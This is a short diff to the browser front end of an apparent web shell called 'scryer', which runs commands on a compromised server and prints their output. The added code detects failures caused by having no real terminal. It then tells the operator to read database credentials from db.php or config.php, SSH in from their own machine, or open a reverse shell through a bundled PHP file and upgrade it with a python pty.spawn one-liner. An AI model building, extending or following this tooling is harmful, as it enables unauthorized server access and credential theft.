@@ -100,6 +100,14 @@ async function run(cmd){
     const j=await r.json();
     cwd=j.cwd;prompt=j.prompt;promptEl.textContent=prompt;
     if(j.output)println(esc(j.output.replace(/\n$/,'')));
+    // Web shells have no real TTY: su/sudo/ssh/passwd will refuse. Point the
+    // operator at the approach that actually works.
+    if(j.output && /must be run from a terminal|no( |-)?tty|not a tty|standard input isn.?t a terminal/i.test(j.output)){
+      println('<span class="p">[scryer] '+cmd.split(" ")[0]+
+        ' needs a real TTY. Recover the password (cat db.php/config.php) and '+
+        'SSH in from YOUR box, or catch a reverse shell (shells/reverse-shell.php) '+
+        "then: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'</span>");
+    }
   }catch(e){println('<span class="err">[request failed] '+esc(''+e)+'</span>');}
 }
 input.addEventListener('keydown',e=>{
